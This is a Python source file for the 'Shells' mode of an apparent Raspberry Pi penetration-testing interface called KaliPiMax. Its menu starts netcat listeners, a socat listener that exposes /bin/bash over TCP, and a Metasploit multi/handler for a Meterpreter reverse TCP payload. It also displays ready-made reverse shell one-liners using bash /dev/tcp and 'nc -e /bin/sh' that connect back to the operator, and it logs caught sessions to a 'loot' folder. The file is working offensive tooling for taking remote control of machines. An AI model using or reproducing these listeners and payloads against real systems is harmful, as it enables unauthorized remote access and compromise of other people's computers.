#!/usr/bin/env python3
"""
KaliPiMax Shells Mode
Reverse shell listeners and handlers.
"""

import socket
from PIL import Image

from ui.base_mode import MenuMode
from ui.renderer import Canvas
from core.state import state, AlertLevel
from core.payload import payload_runner, get_loot_path


def get_local_ip() -> str:
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"


class ShellsMode(MenuMode):
    """
    Reverse shell listener mode.
    
    Actions: NC listener, Metasploit handler, shell command hints
    """
    
    DEFAULT_PORT = 4444
    
    def __init__(self):
        super().__init__("SHELLS", "💻")
        
        self._local_ip = None
        self._port = self.DEFAULT_PORT
        
        self._menu_items = [
            {'icon': '●', 'text': 'NC Listener 4444', 'action': self._nc_listener_4444},
            {'icon': '●', 'text': 'NC Listener 443', 'action': self._nc_listener_443},
            {'icon': '●', 'text': 'NC Listener 80', 'action': self._nc_listener_80},
            {'icon': '●', 'text': 'Socat Listener', 'action': self._socat_listener},
            {'icon': '●', 'text': 'MSF Handler', 'action': self._msf_handler},
            {'icon': '●', 'text': 'Show Payloads', 'action': self._show_payloads},
            {'icon': '■', 'text': 'Kill Listeners', 'action': self._kill_listeners},
        ]
    
    def on_enter(self):
        super().on_enter()
        self._local_ip = get_local_ip()
    
    def _nc_listener_4444(self):
        """Start netcat listener on port 4444."""
        self._start_nc_listener(4444)
    
    def _nc_listener_443(self):
        """Start netcat listener on port 443."""
        self._start_nc_listener(443)
    
    def _nc_listener_80(self):
        """Start netcat listener on port 80."""
        self._start_nc_listener(80)
    
    def _start_nc_listener(self, port: int):
        """Start a netcat listener on specified port."""
        outfile = get_loot_path("shells", f"nc_{port}", "log")
        
        # Use sudo for privileged ports
        sudo = "sudo " if port < 1024 else ""
        
        payload_runner.run(
            f"{sudo}nc -lvnp {port} 2>&1 | tee {outfile}",
            f"NC Listener :{port}",
            timeout=3600  # 1 hour timeout for listeners
        )
        
        state.add_alert(f"Listening on {self._local_ip}:{port}", AlertLevel.INFO)
    
    def _socat_listener(self):
        """Start socat listener with PTY support."""
        port = 4444
        outfile = get_loot_path("shells", "socat", "log")
        
        payload_runner.run(
            f"socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid "
            f"2>&1 | tee {outfile}",
            f"Socat :{port}",
            timeout=3600
        )
        
        state.add_alert(f"Socat on {self._local_ip}:{port}", AlertLevel.INFO)
    
    def _msf_handler(self):
        """Start Metasploit multi/handler."""
        port = 4444
        
        # Create a resource file for msfconsole
        rc_content = f"""
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT {port}
set ExitOnSession false
exploit -j
"""
        
        payload_runner.run(
            f"echo '{rc_content}' > /tmp/handler.rc && "
            f"msfconsole -q -r /tmp/handler.rc",
            "MSF Handler",
            timeout=3600
        )
        
        state.add_alert(f"MSF on {self._local_ip}:{port}", AlertLevel.INFO)
    
    def _show_payloads(self):
        """Show reverse shell payload examples."""
        ip = self._local_ip
        
        state.add_alert("== REVERSE SHELLS ==", AlertLevel.INFO)
        state.add_alert(f"bash -i >& /dev/tcp/{ip}/4444 0>&1", AlertLevel.INFO)
        state.add_alert(f"nc -e /bin/sh {ip} 4444", AlertLevel.INFO)
        state.add_alert(f"python: See loot/shells/", AlertLevel.INFO)
    
    def _kill_listeners(self):
        """Kill all listener processes."""
        payload_runner.run(
            "pkill -9 nc; pkill -9 ncat; pkill -9 socat; "
            "pkill -9 msfconsole; pkill -9 ruby",
            "Kill Listeners",
            timeout=10
        )
    
    def render(self) -> Image.Image:
        canvas = self._create_canvas()
        
        y = self._render_header(canvas)
        
        # Show local IP for payload generation
        canvas.text(2, y, f"LHOST: {self._local_ip}", colour='ok', font='small')
        y += 12
        
        # Menu
        self._menu.start_y = y
        self._render_menu(canvas, start_y=y)
        
        self._render_footer(canvas, "K3:Kill listeners")
        
        return canvas.get_image()
    
    def on_key3(self):
        """Kill all listeners."""
        self._kill_listeners()
